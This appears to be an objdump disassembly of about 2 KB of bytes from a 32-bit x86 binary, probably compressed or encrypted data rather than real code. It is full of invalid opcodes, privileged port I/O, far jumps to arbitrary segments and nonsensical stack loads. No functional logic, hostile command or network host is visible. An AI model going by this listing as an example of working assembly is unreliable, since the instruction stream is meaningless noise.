  416cce:	mov    cl,0xd9
  416cd0:	mov    bh,0xac
  416cd2:	push   eax
  416cd3:	dec    ebx
  416cd4:	loope  0x416d10
  416cd6:	outs   dx,DWORD PTR ds:[esi]
  416cd7:	and    DWORD PTR [ebx],eax
  416cd9:	inc    ebp
  416cda:	mov    BYTE PTR [ebp+0xe1ec823],bh
  416ce0:	sub    al,0xe
  416ce2:	sbb    edi,DWORD PTR ds:0xeda7b88e
  416ce8:	xbegin 0xc6838ae6
  416cee:	es adc esi,edi
  416cf1:	aam    0xc7
  416cf3:	push   esi
  416cf4:	push   ebp
  416cf5:	ret    0x4c99
  416cf8:	ror    DWORD PTR [ecx],1
  416cfa:	add    DWORD PTR [ebx-0x369f0ba5],edi
  416d00:	das    
  416d01:	or     edi,DWORD PTR cs:[ebp+0x5f]
  416d05:	fistp  QWORD PTR [ecx+0x36db666a]
  416d0b:	sub    al,0x7a
  416d0d:	jmp    0x416d88
  416d0f:	mov    ds:0x5c9af124,eax
  416d14:	mov    al,0xc4
  416d16:	mov    ah,0xd0
  416d18:	lahf   
  416d19:	mov    esp,0x54a65d01
  416d1e:	icebp  
  416d1f:	push   edi
  416d20:	push   0xffffffc4
  416d22:	push   esi
  416d23:	mov    dl,0x91
  416d25:	jmp    0x4225:0x4cadd816
  416d2c:	rol    DWORD PTR [eax-0x6d],0x7a
  416d30:	dec    esp
  416d31:	add    DWORD PTR [ebx-0x14],eax
  416d34:	scas   eax,DWORD PTR es:[edi]
  416d35:	jle    0x416da5
  416d37:	jb     0x416cfc
  416d39:	jle    0x416d60
  416d3b:	sub    al,0x88
  416d3d:	or     bh,BYTE PTR [ebp-0x6fb4ffc3]
  416d43:	xor    DWORD PTR [edx-0x989689],0x7f
  416d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d4b:	jbe    0x416d3d
  416d4d:	mov    ch,0x2e
  416d4f:	jecxz  0x416d5b
  416d51:	stc    
  416d52:	ds jg  0x416d5a
  416d55:	mov    edi,0x42fa8e3b
  416d5a:	call   0x13555340
  416d5f:	ins    DWORD PTR es:[edi],dx
  416d60:	out    0x32,eax
  416d62:	jbe    0x416dba
  416d64:	(bad)  
  416d65:	iret   
  416d66:	adc    eax,0x28d3032b
  416d6b:	mov    ebp,0x5f8d528
  416d70:	push   0xffffffd4
  416d72:	mov    ebp,0x1f1a3b53
  416d77:	jmp    0xf6e9:0x17f8ff91
  416d7e:	shl    BYTE PTR [ecx],cl
  416d80:	cs rol ah,1
  416d83:	call   0xad75e983
  416d88:	outs   dx,BYTE PTR ds:[esi]
  416d89:	lock shr al,1
  416d8c:	inc    ebx
  416d8e:	ins    BYTE PTR es:[edi],dx
  416d8f:	jg     0x416d97
  416d91:	cmp    BYTE PTR [edi-0x63],cl
  416d94:	outs   dx,BYTE PTR ds:[esi]
  416d95:	(bad)  
  416d96:	test   al,0xdc
  416d98:	jg     0x416e12
  416d9a:	ror    DWORD PTR [eax+0x2f],1
  416d9d:	cmp    bh,BYTE PTR [ebp+0xe136508]
  416da3:	fiadd  DWORD PTR [eax]
  416da5:	add    al,0x97
  416da7:	lds    ebp,FWORD PTR [esp+edi*2]
  416daa:	xchg   ecx,eax
  416dab:	call   0x4cce:0xf484cd7a
  416db2:	adc    BYTE PTR [edx+0x4c],0x22
  416db6:	jle    0x416d6e
  416db8:	and    ch,BYTE PTR [eax]
  416dba:	cmp    bl,ch
  416dbc:	(bad)  
  416dbd:	shr    al,1
  416dbf:	cmp    DWORD PTR [ebx-0x2b0d092c],0xffffffc8
  416dc6:	push   edi
  416dc7:	and    al,0xac
  416dc9:	test   eax,0xb0c78011
  416dce:	pusha  
  416dcf:	dec    edi
  416dd0:	push   ss
  416dd1:	ins    BYTE PTR es:[edi],dx
  416dd2:	xchg   ebx,eax
  416dd3:	xchg   esi,eax
  416dd4:	leave  
  416dd5:	loopne 0x416d5c
  416dd7:	lea    esp,[ebp+0x3a2a60b4]
  416ddd:	inc    ebx
  416dde:	and    BYTE PTR [esi-0x76],bh
  416de1:	sbb    eax,0x4ea96a23
  416de6:	dec    edx
  416de7:	mov    dl,BYTE PTR [ecx-0x4e6dc1ff]
  416ded:	or     ch,BYTE PTR [edx+0x762f5308]
  416df3:	fistp  QWORD PTR [esi]
  416df5:	ret    
  416df6:	mov    edi,DWORD PTR [edi+0x10]
  416df9:	enter  0x8049,0x71
  416dfd:	lock dec edx
  416dff:	sbb    esp,DWORD PTR [edi+0x71]
  416e02:	jb     0x416dfd
  416e04:	adc    ch,ch
  416e06:	xchg   esp,eax
  416e07:	test   eax,0xfedfb2ca
  416e0c:	out    0x54,eax
  416e0e:	mov    esp,0xa724b611
  416e13:	mov    edi,0x30a997c2
  416e18:	mov    esi,0xd385e1c2
  416e1d:	ja     0x416e91
  416e1f:	aam    0xd5
  416e21:	sub    al,0xe0
  416e23:	add    al,0xf4
  416e25:	enter  0xe19d,0xfa
  416e29:	sub    DWORD PTR [ebx],0xf271b4df
  416e2f:	iret   
  416e30:	jmp    0xa2e2639b
  416e35:	add    ebp,ebp
  416e37:	lahf   
  416e38:	es dec ebp
  416e3a:	add    bl,bl
  416e3c:	mov    al,0xd1
  416e3e:	xlat   BYTE PTR ds:[ebx]
  416e3f:	xor    DWORD PTR [eax+0x65],esp
  416e42:	or     BYTE PTR [esi],bh
  416e44:	out    0x39,eax
  416e46:	add    al,0x3a
  416e48:	adc    ch,bl
  416e4a:	call   0x7307:0x9cff3fe4
  416e51:	or     ch,BYTE PTR [edi-0x19]
  416e54:	ret    0x8743
  416e57:	test   eax,0xf7c22420
  416e5c:	stos   DWORD PTR es:[edi],eax
  416e5d:	cmp    BYTE PTR [ebx],dl
  416e5f:	leave  
  416e60:	(bad)  
  416e61:	fst    QWORD PTR [edx+0x6e]
  416e64:	xor    bl,BYTE PTR [ecx-0x8]
  416e67:	dec    ecx
  416e68:	stos   BYTE PTR es:[edi],al
  416e69:	mov    edx,0x1b141357
  416e6e:	dec    edx
  416e6f:	out    dx,eax
  416e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e71:	xor    ebp,DWORD PTR [eax+0x15c89c14]
  416e77:	inc    edx
  416e78:	mov    ecx,0x7bee3c7c
  416e7d:	inc    edi
  416e7f:	cli    
  416e80:	ins    BYTE PTR es:[edi],dx
  416e81:	outs   dx,BYTE PTR ds:[esi]
  416e82:	gs (bad) 
  416e84:	cmc    
  416e85:	std    
  416e86:	xchg   edi,eax
  416e87:	add    edx,DWORD PTR [ebx]
  416e89:	jecxz  0x416e89
  416e8b:	scas   al,BYTE PTR es:[edi]
  416e8c:	push   eax
  416e8d:	pop    edi
  416e8e:	xchg   ebp,eax
  416e8f:	sbb    eax,DWORD PTR ds:0xfdcd93b8
  416e95:	jge    0x416e42
  416e97:	push   ebx
  416e98:	aas    
  416e99:	xor    BYTE PTR [edx+eiz*8+0x29],dh
  416e9d:	sbb    ch,ch
  416e9f:	or     eax,0x818709a9
  416ea4:	sti    
  416ea5:	retf   0xd5ff
  416ea8:	pushf  
  416ea9:	inc    esi
  416eaa:	and    bl,dl
  416eac:	ja     0x416e8f
  416eae:	and    edx,DWORD PTR [edi-0x2e8b5625]
  416eb4:	rcl    edx,cl
  416eb6:	sar    DWORD PTR [edx-0x248b1024],0x57
  416ebd:	lock add eax,0xe40053d3
  416ec3:	and    eax,0x16502396
  416ec8:	jp     0x416e5f
  416eca:	lods   al,BYTE PTR ds:[esi]
  416ecb:	data16 mov ds:0xf87e7b6c,al
  416ed1:	sub    DWORD PTR es:[ebx-0x4f912d1],edi
  416ed8:	pushf  
  416ed9:	mov    esp,0xfbb9164f
  416ede:	adc    eax,0x9600b7fd
  416ee3:	mov    bh,0x40
  416ee5:	fisttp DWORD PTR [ecx+0x49]
  416ee8:	repz jno 0x416f35
  416eeb:	jg     0x416f1d
  416eed:	test   BYTE PTR [ebx+0x48],al
  416ef0:	lea    esi,[esi-0xc630e9d]
  416ef6:	add    DWORD PTR [eax-0x7e],eax
  416ef9:	jb     0x416f56
  416efb:	adc    al,ch
  416efd:	mov    bh,0xb5
  416eff:	push   esi
  416f00:	mov    cl,BYTE PTR [esi+ebx*2]
  416f03:	push   cs
  416f04:	sbb    DWORD PTR [edi+0x10],esi
  416f07:	imul   edx,esi,0x44cecee3
  416f0d:	(bad)  
  416f0e:	scas   al,BYTE PTR es:[edi]
  416f0f:	push   esi
  416f10:	jecxz  0x416eeb
  416f12:	sbb    eax,0xe2a98488
  416f17:	(bad)  
  416f18:	shr    BYTE PTR [eax],1
  416f1a:	mov    ch,0x70
  416f1c:	shl    ebp,1
  416f1e:	sub    ch,ch
  416f20:	pop    es
  416f21:	lea    esi,[eax+0x124a7b4b]
  416f27:	xchg   edi,eax
  416f28:	dec    ebx
  416f29:	mov    esp,0x10121995
  416f2e:	and    eax,0xd3420789
  416f33:	mov    ah,BYTE PTR [ebx]
  416f35:	scas   al,BYTE PTR es:[edi]
  416f36:	ss sbb al,0xfb
  416f39:	iret   
  416f3a:	test   BYTE PTR [edi-0x68],dl
  416f3d:	mov    ah,0xf8
  416f3f:	lea    ecx,[edi+0x26a7a41b]
  416f45:	jae    0x416f87
  416f47:	mov    ch,0x11
  416f49:	jo     0x416f57
  416f4b:	mov    bl,0xff
  416f4d:	fldenv [eax]
  416f4f:	icebp  
  416f50:	addr16 mov cl,0x1f
  416f53:	and    edi,DWORD PTR [edi+ebp*2]
  416f56:	xchg   esi,eax
  416f57:	dec    ebx
  416f58:	jbe    0x416fc2
  416f5a:	adc    BYTE PTR [ecx-0x6df84dcb],al
  416f60:	enter  0x9816,0x73
  416f64:	outs   dx,DWORD PTR ds:[esi]
  416f65:	pop    ss
  416f66:	loope  0x416f0d
  416f68:	jle    0x416fcb
  416f6a:	or     esi,DWORD PTR ds:0x8a68da3b
  416f70:	out    dx,al
  416f71:	dec    edi
  416f72:	sbb    al,0x4d
  416f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f75:	int3   
  416f76:	bound  esi,QWORD PTR [ebp+0x4624bebc]
  416f7c:	jno    0x416f05
  416f7e:	out    dx,eax
  416f7f:	clc    
  416f80:	push   ebx
  416f81:	cli    
  416f82:	(bad)  
  416f83:	mov    ebp,0x51742714
  416f88:	or     eax,0x7d8b2442
  416f8d:	mov    al,ds:0x6bcbf148
  416f92:	jbe    0x416f87
  416f94:	aam    0xa2
  416f96:	xchg   ebx,eax
  416f97:	sbb    al,0x38
  416f99:	mov    DWORD PTR [edx+0x6d13c6a5],esp
  416f9f:	repnz dec edi
  416fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fa2:	nop
  416fa3:	in     eax,0x4b
  416fa5:	sbb    BYTE PTR [edx],al
  416fa7:	call   0x4f683b98
  416fac:	add    esp,esi
  416fae:	mov    ds:0xe7d3a01c,eax
  416fb3:	test   al,0x7f
  416fb5:	imul   DWORD PTR [edi-0x1c5c1414]
  416fbb:	ret    0x9563
  416fbe:	je     0x416f96
  416fc0:	push   ebx
  416fc1:	lods   al,BYTE PTR ds:[esi]
  416fc2:	lods   eax,DWORD PTR ds:[esi]
  416fc3:	fcomp  QWORD PTR [edi+edi*4-0x13572076]
  416fca:	cwde   
  416fcb:	ins    DWORD PTR es:[edi],dx
  416fcc:	add    ah,BYTE PTR [ecx+0x2105be95]
  416fd2:	fmul   QWORD PTR [ebp+0x52f72e3a]
  416fd8:	adc    ebx,edx
  416fda:	lods   eax,DWORD PTR ds:[esi]
  416fdb:	adc    DWORD PTR [esi+edx*4],ecx
  416fde:	inc    ebx
  416fe0:	outs   dx,BYTE PTR ds:[esi]
  416fe1:	das    
  416fe2:	lahf   
  416fe3:	ds sahf 
  416fe5:	int3   
  416fe6:	push   cs
  416fe7:	aas    
  416fe8:	xlat   BYTE PTR ds:[ebx]
  416fe9:	adc    edi,DWORD PTR [ebx+ebx*2]
  416fec:	push   ecx
  416fed:	add    dl,BYTE PTR [ecx-0xa]
  416ff0:	aad    0xae
  416ff2:	jae    0x41700c
  416ff4:	mov    ch,0x64
  416ff6:	sbb    BYTE PTR [eax+0x4f1d5fb6],0x41
  416ffd:	cmp    eax,DWORD PTR ds:0xa6c8c964
  417003:	sahf   
  417004:	adc    al,0xb1
  417006:	lea    esi,[edi-0x4c]
  417009:	sub    BYTE PTR [edi+0x68],ah
  41700c:	imul   eax,DWORD PTR [ecx-0x4d7ff4ba],0xffffffac
  417013:	jne    0x416faa
  417015:	mov    cl,BYTE PTR [esi]
  417017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417018:	retf   
  417019:	clc    
  41701a:	add    BYTE PTR [eax-0x37],al
  41701d:	mov    eax,0x5f4b3623
  417022:	bound  ebx,QWORD PTR [edx+edi*4]
  417025:	push   edi
  417026:	rcl    DWORD PTR [edi],cl
  417028:	(bad)  
  417029:	ds pop es
  41702b:	pop    ecx
  41702c:	dec    ebx
  41702d:	inc    esp
  41702e:	repnz pop DWORD PTR [esp+ecx*4]
  417032:	add    eax,0x68c5ca69
  417037:	jmp    0x57d8:0xdcb88356
  41703e:	lods   al,BYTE PTR ds:[esi]
  41703f:	dec    ebx
  417040:	arpl   di,cx
  417042:	out    dx,al
  417043:	jae    0x417085
  417045:	adc    bh,BYTE PTR ds:0xe89ef3c7
  41704b:	fisubr DWORD PTR [esi]
  41704d:	cmp    edi,DWORD PTR [edx+0x7b606d8f]
  417053:	test   BYTE PTR [esp+edx*2-0x48],dl
  417057:	shr    DWORD PTR ds:0x772547e8,1
  41705d:	adc    DWORD PTR [esi],edx
  41705f:	sub    BYTE PTR [edx],0xe9
  417062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417063:	cmp    esi,ecx
  417065:	push   0xffffffa9
  417067:	ficomp WORD PTR [ebp+ecx*4-0x7d]
  41706b:	shl    DWORD PTR [ebp+0x78],0xd4
  41706f:	push   ebp
  417070:	(bad)  
  417071:	repz mov WORD PTR [ecx-0x3a],ss
  417075:	lods   al,BYTE PTR ds:[esi]
  417076:	gs mov esi,0x60d454aa
  41707c:	xor    DWORD PTR [edi+ecx*8],ecx
  41707f:	sbb    al,0x6
  417081:	fnstsw WORD PTR [edi+0x114adab9]
  417087:	cmp    al,0x45
  417089:	daa    
  41708a:	test   DWORD PTR [edi-0x5a],ebp
  41708d:	rcr    DWORD PTR ds:[ebp-0x44],1
  417091:	test   al,0x5a
  417093:	inc    esi
  417094:	retf   
  417095:	mov    edi,0x85cbab0b
  41709a:	repnz loopne 0x417047
  41709d:	into   
  41709e:	or     bh,BYTE PTR [ebx+0x1b]
  4170a1:	jl     0x417023
  4170a3:	stos   BYTE PTR es:[edi],al
  4170a4:	xor    eax,0x7fa6d970
  4170a9:	test   BYTE PTR [ecx],0x57
  4170ac:	adc    DWORD PTR [ebx],esp
  4170ae:	dec    edx
  4170af:	inc    esp
  4170b0:	mov    WORD PTR [eax-0xd2fb7eb],gs
  4170b6:	bound  ecx,QWORD PTR [ebx-0x7a]
  4170b9:	les    ebx,FWORD PTR [ebp-0x37007075]
  4170bf:	clc    
  4170c0:	ret    
  4170c1:	mov    al,0x36
  4170c3:	jo     0x417058
  4170c5:	xor    esi,DWORD PTR [ecx+0x1525e49b]
  4170cb:	mov    cl,0x88
  4170cd:	mov    ds:0x9d0e9c45,al
  4170d2:	retf   
  4170d3:	jmp    0x802e816f
  4170d8:	add    cl,ch
  4170da:	jg     0x417129
  4170dc:	aas    
  4170dd:	push   esi
  4170de:	jp     0x4170bb
  4170e0:	je     0x417114
  4170e2:	sub    ecx,DWORD PTR [edi]
  4170e4:	pop    edi
  4170e5:	sbb    eax,0x1b57e569
  4170ea:	push   ecx
  4170eb:	nop
  4170ec:	lods   eax,DWORD PTR ds:[esi]
  4170ed:	shl    BYTE PTR [ebx],0x53
  4170f0:	push   esp
  4170f1:	xor    bl,BYTE PTR [edi]
  4170f3:	es into 
  4170f5:	mov    ds:0x7a4549c8,al
  4170fa:	aad    0x84
  4170fc:	pop    ds
  4170fd:	push   eax
  4170fe:	push   edx
  4170ff:	imul   esi,DWORD PTR [ebx+0x6a024d2],0x2c
  417106:	in     eax,0xcd
  417108:	jp     0x417138
  41710a:	adc    eax,0x6d25144c
  41710f:	jo     0x41712d
  417111:	movzx  ecx,WORD PTR [ecx]
  417114:	in     eax,dx
  417115:	outs   dx,BYTE PTR ds:[esi]
  417116:	cld    
  417117:	clc    
  417118:	aaa    
  417119:	gs aam 0xd6
  41711c:	in     al,0x9a
  41711e:	sub    eax,0x6c72763b
  417123:	aaa    
  417124:	mov    bl,0xc4
  417126:	stos   DWORD PTR es:[edi],eax
  417127:	xor    ebp,DWORD PTR [ecx]
  417129:	ins    DWORD PTR es:[edi],dx
  41712a:	in     eax,0x8
  41712c:	retf   0x5639
  41712f:	jge    0x41717c
  417131:	dec    edi
  417132:	loop   0x41719d
  417134:	or     eax,0x811ec525
  417139:	pop    ss
  41713a:	xor    bl,BYTE PTR [ebx+ebp*4-0x25]
  41713e:	dec    esi
  41713f:	mul    ebx
  417141:	in     eax,dx
  417142:	outs   dx,DWORD PTR ds:[esi]
  417143:	cmp    edi,DWORD PTR [ecx-0x5f9483db]
  417149:	(bad)  [edi]
  41714b:	pop    ecx
  41714c:	xor    ecx,ecx
  41714e:	xchg   ebp,eax
  41714f:	sbb    al,0xdc
  417151:	dec    edx
  417152:	xor    al,0x31
  417154:	leave  
  417155:	pop    es
  417156:	idiv   BYTE PTR [ecx]
  417158:	fcmovnb st,st(7)
  41715a:	cmc    
  41715b:	cmp    BYTE PTR [esi+ebp*4],cl
  41715e:	loop   0x41717e
  417160:	push   DWORD PTR [edx+0x72]
  417163:	sbb    eax,0x4c4f4faa
  417168:	pop    ecx
  417169:	iret   
  41716a:	into   
  41716b:	sbb    eax,0xef39a90e
  417170:	cli    
  417171:	push   edi
  417172:	aaa    
  417173:	inc    ebp
  417174:	pop    esi
  417175:	ins    BYTE PTR es:[edi],dx
  417176:	pusha  
  417177:	imul   ebx,DWORD PTR [edx-0x113d8274],0x54
  41717e:	scas   al,BYTE PTR es:[edi]
  41717f:	ret    0x3dff
  417182:	dec    esi
  417183:	retf   
  417184:	cmp    al,0xd7
  417186:	cs cs cmc 
  417189:	sar    DWORD PTR [esi-0x14],1
  41718c:	push   ebx
  41718d:	bound  eax,QWORD PTR [edx]
  41718f:	xchg   ebx,eax
  417190:	or     eax,0xdbcba3de
  417195:	cdq    
  417196:	sbb    BYTE PTR [esp+ebx*2-0x1a],dh
  41719a:	cmp    BYTE PTR [ebp+0x59],cl
  41719d:	jb     0x41714d
  41719f:	cs repnz add eax,0x23afed7a
  4171a6:	mov    al,0x0
  4171a8:	dec    ebp
  4171a9:	xchg   dl,bh
  4171ab:	into   
  4171ac:	into   
  4171ad:	or     al,0xb6
  4171af:	imul   esi,DWORD PTR ds:0x9bcefd6f,0x8562babb
  4171b9:	push   eax
  4171ba:	arpl   WORD PTR [ebx+0x75],dx
  4171bd:	lods   eax,DWORD PTR ds:[esi]
  4171be:	inc    edx
  4171bf:	icebp  
  4171c0:	stos   BYTE PTR es:[edi],al
  4171c1:	inc    ebp
  4171c2:	pop    ss
  4171c3:	into   
  4171c4:	fcomip st,st(5)
  4171c6:	mov    ch,0xdb
  4171c8:	arpl   WORD PTR [bp-0x76],di
  4171cc:	pop    esp
  4171cd:	jmp    0x4171ca
  4171cf:	cld    
  4171d0:	jmp    0x3cb5:0x82d6d17f
  4171d7:	dec    eax
  4171d8:	adc    cl,BYTE PTR [esi-0x31eea916]
  4171de:	je     0x4171be
  4171e0:	idiv   BYTE PTR [esi+0x6682e25]
  4171e6:	and    al,0x81
  4171e8:	mov    ebp,ebx
  4171ea:	fsubr  DWORD PTR [ecx+0x57]
  4171ed:	inc    edi
  4171ee:	jmp    0xd91b:0x489ae1ef
  4171f5:	xchg   ebp,eax
  4171f6:	add    bh,dl
  4171f8:	push   0x91c1a30d
  4171fd:	sub    eax,0xe622f630
  417202:	xchg   edx,eax
  417203:	inc    edx
  417204:	dec    edx
  417205:	mov    WORD PTR [ecx],es
  417207:	mov    cl,0xa3
  417209:	sbb    bh,BYTE PTR [ecx]
  41720b:	int3   
  41720c:	push   ss
  41720d:	arpl   WORD PTR [ebx],sp
  41720f:	pop    ecx
  417210:	cmc    
  417211:	jnp    0x4171fe
  417213:	dec    ebp
  417214:	mov    BYTE PTR [eax+0x5bfb252c],ch
  41721a:	outs   dx,DWORD PTR ds:[esi]
  41721b:	int3   
  41721c:	dec    ebx
  41721d:	mov    cl,0x8d
  41721f:	fbstp  TBYTE PTR [eax+ebp*2]
  417222:	loope  0x4171cf
  417224:	inc    esi
  417225:	(bad)  
  417227:	inc    ebp
  417228:	cmp    ebp,DWORD PTR [esi+ebx*4+0x315f8b96]
  41722f:	ret    
  417230:	mov    al,ds:0x9b5161f5
  417235:	gs cdq 
  417237:	in     eax,dx
  417238:	sbb    BYTE PTR [ebx],bh
  41723a:	cmc    
  41723b:	imul   ebp,DWORD PTR [edx+0x624f3816],0x830e7968
  417245:	mov    ebx,0xd9de96ec
  41724a:	sub    ebx,DWORD PTR ds:0x3a37a924
  417250:	xor    edi,esp
  417252:	loop   0x4172bf
  417254:	jl     0x4171e5
  417256:	mov    ebx,0x80af8787
  41725b:	cmp    eax,0x5772aabe
  417260:	iret   
  417261:	int    0x4f
  417263:	out    dx,eax
  417264:	fdivr  QWORD PTR [eax+0x2fd315cf]
  41726a:	ja     0x417243
  41726c:	sahf   
  41726d:	xor    dh,ch
  41726f:	gs int 0x15
  417272:	push   ebp
  417273:	push   es
  417274:	mov    al,ds:0x8e44c4f6
  417279:	or     esp,edx
  41727b:	sub    ebp,ebp
  41727d:	mov    ah,0x74
  41727f:	dec    ecx
  417280:	ins    DWORD PTR es:[edi],dx
  417281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417282:	jbe    0x4172a7
  417284:	popf   
  417285:	mov    ecx,0xb4c1a0ee
  41728a:	jnp    0x4172b0
  41728c:	enter  0x5e28,0xd8
  417290:	or     BYTE PTR [esi],bl
  417292:	leave  
  417293:	or     BYTE PTR [eax],bl
  417295:	cmp    bl,BYTE PTR [edi-0x4064f234]
  41729b:	sub    ah,BYTE PTR [edx-0xa]
  41729e:	xor    bl,BYTE PTR ds:0xd3acbc5e
  4172a4:	or     dl,BYTE PTR [ebx+0x770e752b]
  4172aa:	push   ebx
  4172ab:	arpl   WORD PTR [ebx+eiz*1],cx
  4172ae:	push   ecx
  4172af:	arpl   WORD PTR [ecx+0x6d306388],cx
  4172b5:	mov    edi,0xb20ddf5d
  4172ba:	or     eax,0xce92d7f7
  4172bf:	ins    BYTE PTR es:[edi],dx
  4172c0:	aaa    
  4172c1:	outs   dx,BYTE PTR ds:[esi]
  4172c2:	into   
  4172c3:	or     BYTE PTR [edi],0x7f
  4172c6:	xchg   ebx,eax
  4172c7:	retf   
  4172c8:	imul   edx,ebx,0xe3e85884
  4172ce:	ins    DWORD PTR es:[edi],dx
  4172cf:	adc    DWORD PTR ss:[edi],0x38
  4172d3:	mov    al,ds:0x9bacc5dd
  4172d8:	jno    0x4172c0
  4172da:	loope  0x417274
  4172dc:	test   esi,esi
  4172de:	sti    
  4172df:	jl     0x4172bd
  4172e1:	into   
  4172e2:	ins    BYTE PTR es:[edi],dx
  4172e3:	dec    esi
  4172e4:	sub    eax,0xef252770
  4172e9:	push   esi
  4172ea:	ins    DWORD PTR es:[edi],dx
  4172eb:	int3   
  4172ec:	pop    esi
  4172ed:	mov    ds,ecx
  4172ef:	fst    QWORD PTR [ecx+esi*4]
  4172f2:	add    BYTE PTR [ecx-0x28],cl
  4172f5:	push   cs
  4172f6:	xor    DWORD PTR [ebx+0x4],ebx
  4172f9:	mov    ds:0x7ce27768,eax
  4172fe:	ret    0x2e90
  417301:	or     BYTE PTR [esi-0x65],bl
  417304:	jns    0x4172d0
  417306:	es stos BYTE PTR es:[edi],al
  417308:	mov    al,ds:0xc9631b5f
  41730d:	test   eax,0x1819a1e2
  417312:	mov    ebx,0xeb9c6a70
  417317:	mov    ebp,0x5fff52f7
  41731c:	fsub   st,st(1)
  41731e:	stc    
  41731f:	xchg   ebp,eax
  417320:	ds adc bx,0x6ac4
  417326:	sahf   
  417327:	clc    
  417328:	or     edx,DWORD PTR [ebx+0x1c]
  41732b:	cmp    cl,BYTE PTR [ecx-0x4642152]
  417331:	sahf   
  417332:	leave  
  417333:	xchg   ebx,ecx
  417335:	adc    al,BYTE PTR [esi+0x490c1812]
  41733b:	xor    esi,0xffffffea
  41733e:	jp     0x41737c
  417340:	stc    
  417341:	inc    esi
  417342:	sbb    edi,edi
  417344:	cld    
  417345:	fild   DWORD PTR [ebx+0x7b2f7c20]
  41734b:	xchg   esi,eax
  41734c:	retf   0x2d70
  41734f:	lods   eax,DWORD PTR ds:[esi]
  417350:	mov    ah,0x36
  417352:	stc    
  417353:	imul   BYTE PTR [edx]
  417355:	rcr    ebx,cl
  417357:	cwde   
  417358:	iret   
  417359:	jno    0x417309
  41735b:	mov    al,0x31
  41735d:	imul   edx,DWORD PTR [eax+0x57],0xffffff8f
  417361:	lock pusha 
  417363:	mov    eax,ds:0xc2e86766
  417368:	aam    0xdc
  41736a:	mov    bl,0x3a
  41736c:	in     al,dx
  41736d:	pop    ss
  41736e:	pop    esp
  41736f:	dec    esp
  417370:	mov    dh,0xb2
  417372:	jno    0x4173ef
  417374:	nop
  417375:	mov    ch,0xd7
  417377:	xchg   ecx,eax
  417378:	into   
  417379:	test   BYTE PTR ds:0x469303cb,dh
  41737f:	repnz mov eax,DWORD PTR gs:0x978b3f13
  417387:	das    
  417388:	mov    bl,0xcb
  41738a:	pop    esp
  41738b:	mov    esi,0x992864c2
  417390:	test   DWORD PTR [eax-0x4c747061],esp
  417396:	fst    DWORD PTR [esi]
  417398:	cmc    
  417399:	inc    eax
  41739a:	mov    ebp,eax
  41739c:	js     0x4173a9
  41739e:	fild   WORD PTR [ebx]
  4173a0:	sub    al,0x44
  4173a2:	adc    DWORD PTR [eax],edx
  4173a4:	(bad)  
  4173a6:	fnsave [edx]
  4173a8:	sti    
  4173a9:	jl     0x417377
  4173ab:	test   BYTE PTR [ecx+0x91baff7],0xb
  4173b2:	(bad)  
  4173b3:	lds    ebp,FWORD PTR [ebp+0x43389df0]
  4173b9:	rol    BYTE PTR [ebp+0xc808ae6],0x1a
  4173c0:	mov    esp,0x6535b2ca
  4173c5:	lock ror ecx,1
  4173c8:	fnsave [eax-0x79]
  4173cb:	scas   al,BYTE PTR es:[edi]
  4173cc:	mov    eax,ds:0x6c67fae6
  4173d1:	mov    ebx,edx
  4173d3:	xchg   ebp,eax
  4173d4:	xchg   ebp,eax
  4173d5:	call   0x527d7ad1
  4173da:	and    DWORD PTR [ebx+ebx*8-0x3c7ebb2a],ecx
  4173e1:	das    
  4173e2:	xchg   esp,eax
  4173e3:	sahf   
  4173e4:	and    esi,esi
  4173e6:	mov    ecx,0xa5238289
  4173eb:	jne    0x4173ff
  4173ed:	push   ecx
  4173ee:	sbb    ebx,DWORD PTR [ecx]
  4173f0:	idiv   DWORD PTR [edx-0x66]
  4173f3:	cmp    eax,DWORD PTR [ebx-0x19]
  4173f6:	xchg   edx,eax
  4173f7:	inc    edx
  4173f8:	sbb    BYTE PTR [edi],ah
  4173fa:	ret    
  4173fb:	int3   
  4173fc:	sbb    ecx,DWORD PTR [ecx-0x74]
  4173ff:	(bad)  
  417400:	fsubr  QWORD PTR [ecx+0x4cf08f39]
  417406:	das    
  417407:	fs pop ss
  417409:	mov    dh,0xe9
  41740b:	fcom   DWORD PTR [edx]
  41740d:	fbstp  TBYTE PTR [edi+0x7d7764be]
  417413:	repnz ds add al,ch
  417417:	dec    ecx
  417418:	mov    BYTE PTR [edx+0x21],cl
  41741b:	punpckhwd mm5,QWORD PTR [esi]
  41741e:	inc    ecx
  41741f:	cmp    edi,esp
  417421:	sbb    al,0xe1
  417423:	and    eax,0x5ed9f400
  417428:	ret    
  417429:	cmc    
  41742a:	push   ecx
  41742b:	jno    0x417422
  41742d:	ret    
  41742e:	fst    QWORD PTR [ecx-0x2]
  417431:	enter  0xcf7b,0xaf
  417435:	jmp    0x5305:0x98078ff3
  41743c:	mov    ebp,0x573cd8c8
  417441:	call   0xc2ad:0x951a2938
  417448:	cmp    BYTE PTR [esi-0x39b1161],0xe0
  41744f:	ret    
  417450:	and    al,0xa
  417452:	out    dx,al
  417453:	dec    eax
  417454:	into   
  417455:	dec    esp
  417456:	inc    eax
  417457:	inc    esp
  417458:	test   DWORD PTR [ebp+0x75],esp
  41745b:	mov    eax,0x732e12e7
  417460:	jno    0x417442
  417462:	pop    esi
  417463:	(bad)  
  417464:	cmc    
  417465:	push   ds
  417466:	mov    dh,0x1e
  417468:	mov    edx,0x738f27d8
  41746d:	mov    edx,0x8e7e2da
  417472:	in     eax,0xc9
  417474:	mov    ebp,0x7fd62322
  417479:	mov    cl,BYTE PTR [esi-0x33]
  41747c:	dec    ecx
  41747d:	fist   WORD PTR [edx-0x6a128c09]
  417483:	cdq    
  417484:	popa   
  417485:	in     eax,0x67
  417487:	sar    DWORD PTR [ebp+0x1e35d7ef],cl
  41748d:	aas    
  41748e:	ud1    esp,DWORD PTR [ecx]
  417491:	dec    esi
  417492:	inc    eax
  417493:	sbb    al,0x65
  417495:	inc    ebx
  417496:	sub    ah,dl
  417498:	fwait
  417499:	sbb    al,0xe7
  41749b:	hlt    
  41749c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41749d:	push   ds
  41749e:	test   DWORD PTR [ebx+0x7410c46c],ecx
  4174a4:	mov    BYTE PTR [bx+si-0x4f58],bl
  4174a9:	jo     0x417460
